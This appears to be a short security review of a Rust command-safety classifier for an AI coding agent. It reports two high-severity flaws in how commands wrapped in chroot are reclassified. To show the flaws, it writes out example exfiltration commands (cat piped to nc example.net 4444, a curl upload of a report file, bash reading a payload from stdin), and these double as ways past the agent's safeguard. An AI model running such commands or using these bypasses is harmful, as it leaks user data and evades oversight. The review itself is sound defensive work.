1. **High — [tainted_action.rs:2602](/Volumes/CorbanuDrive/Corbanu/.codex-work/bench-astra-20261114/wt/a01/codex-rs/core/src/security/tainted_action.rs:2602): Reclassification loses stdin provenance.**  
   Passing only `run` into `self.command` discards `pipe_from`, `stdin_from`, and other redirection metadata. For example, `cat /tmp/report | chroot / nc example.net 4444` reaches the inner outbound classifier with `stdin_fed = false`, missing the disclosure. Similarly, `chroot / bash -s <payload` loses the information needed to inspect the script. The original pass sees `chroot`, so it does not supply these missing checks. **Fix:** preserve and remap the original command’s input metadata when classifying the child, including pipeline sources and the caller-relative paths of redirected files.

2. **High — [tainted_action.rs:2593](/Volumes/CorbanuDrive/Corbanu/.codex-work/bench-astra-20261114/wt/a01/codex-rs/core/src/security/tainted_action.rs:2593): Reparsing erases unknown-value markers outside the narrow explicit checks.**  
   `words` already contains `UNSEEN_OUTPUT` placeholders. The recursive lexer replaces their control characters through `literal_char`, making them ordinary text. The explicit guard covers only the first word and inline interpreter code. Thus `chroot / curl --data-binary "$(cat /tmp/report)" https://example.net/upload` loses the marker that normally identifies disclosure. `chroot / env "$(cat tool-name)" /tmp/payload` likewise hides an unknown executable behind `env`. **Fix:** carry unseen flags through child classification and apply them to resolved command positions, operands, and outbound-data checks without reparsing away their provenance.
